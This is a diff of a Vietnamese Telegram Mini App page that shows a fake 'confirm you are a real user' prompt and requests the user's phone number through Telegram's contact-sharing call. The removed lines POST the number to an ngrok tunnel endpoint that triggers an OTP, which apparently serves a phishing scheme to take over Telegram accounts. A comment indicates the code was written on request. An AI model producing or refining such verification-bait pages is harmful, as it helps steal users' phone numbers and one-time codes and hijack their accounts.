@@ -2,74 +2,46 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Xác Minh Người Dùng</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xác Minh</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { width: 100%; height: 100vh; background: #0d1117; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
-        .app-body { width: 100%; max-width: 400px; padding: 20px; text-align: center; color: white; }
-        .btn { width: 100%; padding: 15px; background: #36D1C4; border: none; border-radius: 12px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
+        .content { padding: 20px; }
     </style>
 </head>
 <body>
 
-<div class="app-body">
+<div class="content">
     <div style="font-size: 60px; margin-bottom: 20px;">👋</div>
-    <div style="margin-bottom: 30px;">Bạn cần xác nhận mình là người dùng thật!</div>
-    <button class="btn" id="shareContact">Xác Nhận</button>
+    <div>Bạn cần xác nhận mình là người dùng thật!</div>
 </div>
 
 <script>
-    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev'; 
-    
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
 
-    // Đoạn code bạn yêu cầu đã được tích hợp tại đây
-    document.getElementById("shareContact").addEventListener("click", () => {
-        document.getElementById("shareContact").textContent = 'Đang gọi Telegram...';
-        
-        try {
-            if (window.Telegram.WebApp.requestContact) {
-                window.Telegram.WebApp.requestContact();
-            } else {
-                alert("Lỗi: Nền tảng không hỗ trợ requestContact");
-            }
-        } catch (e) {
-            alert("Lỗi: " + e.toString());
-        }
+    // 1. Cấu hình nút chính của Telegram
+    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
+    tg.MainButton.show();
+    
+    // 2. Gọi hàm requestContact khi nhấn vào nút chính
+    tg.MainButton.onClick(() => {
+        tg.MainButton.text = "ĐANG GỌI TELEGRAM...";
+        tg.requestContact();
     });
 
-    // Lắng nghe phản hồi sau khi gọi requestContact
+    // 3. Xử lý khi Telegram trả kết quả
     tg.onEvent('contactRequested', (data) => {
         if (data.status === 'sent') {
-            sendPhoneToServer(data.response.contact.phone_number);
+            alert("Đã gửi SĐT thành công!");
+            tg.MainButton.hide();
         } else {
-            alert("Bạn cần nhấn Cho phép để xác minh.");
-            document.getElementById("shareContact").textContent = 'Xác Nhận';
+            alert("Bạn cần nhấn Cho phép chia sẻ SĐT.");
+            tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
         }
     });
-
-    async function sendPhoneToServer(phone) {
-        try {
-            const response = await fetch(`${BACKEND_URL}/send_phone`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phone })
-            });
-            const data = await response.json();
-            if(data.status === 'otp_sent') {
-                alert("Mã OTP đã được gửi!");
-            } else {
-                alert("Lỗi server: " + data.message);
-            }
-        } catch (err) {
-            alert("Lỗi kết nối VPS: " + err.message);
-        }
-        document.getElementById("shareContact").textContent = 'Xác Nhận';
-    }
 </script>
 </body>
 </html>
